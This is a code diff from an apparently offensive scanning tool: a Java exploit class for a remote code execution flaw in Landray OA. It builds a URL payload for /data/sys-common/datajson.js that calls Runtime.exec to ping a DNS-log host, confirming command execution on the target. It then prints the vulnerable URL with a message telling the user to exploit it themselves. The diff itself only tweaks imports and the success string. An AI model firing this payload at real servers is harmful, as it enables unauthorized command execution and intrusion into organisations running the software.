@@ -1,9 +1,7 @@
 package exp.oa.landrayoa;
 
 import core.Exploitlnterface;
-
 import java.util.HashMap;
-
 import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
@@ -29,7 +27,7 @@ public class landray_datajson implements Exploitlnterface {
         shell.readFile(shell.dnspath).replace("http://", "");
         String payload = "/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22ping%20-c%204%20" + shell.getRandomString() + "." + dnslog + "%22)&type=1";
         Response response = HttpTools.get(url + payload, new HashMap<String, String>(), "utf-8");
-        if (response.getCode() == 200 && response.getText().contains("success")) {
+        if (response.getCode() == 200 && response.getText().contains("模拟通过")) {
             Platform.runLater(() -> {
                 textArea.appendText("\n漏洞存在 请自行利用\n" + url + payload);
             });
